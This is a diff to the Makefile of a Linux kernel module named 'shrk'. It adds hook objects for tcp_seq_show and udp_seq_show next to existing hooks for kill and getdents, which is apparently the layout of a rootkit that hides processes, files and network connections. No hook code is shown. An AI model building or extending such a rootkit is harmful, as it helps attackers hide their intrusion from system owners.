@@ -21,12 +21,14 @@ EXTRA_CFLAGS += -DSHRK_DEBUG=$(SHRK_DEBUG)             \
 
 # kernel vars cant define with patsubst for some fucking reason
 obj-m := shrk.o 
-shrk-objs := main.o           \
-             util.o           \
-             cmds.o           \
-             hooks.o          \
-             hooks/kill.o     \
-             hooks/getdents.o \
+shrk-objs := main.o               \
+             util.o               \
+             cmds.o               \
+             hooks.o              \
+             hooks/kill.o         \
+             hooks/getdents.o     \
+             hooks/tcp_seq_show.o \
+             hooks/udp_seq_show.o \
              cmds/protect.o
 #        hooks/newfstatat.o \
 #        hooks/statx.o      \
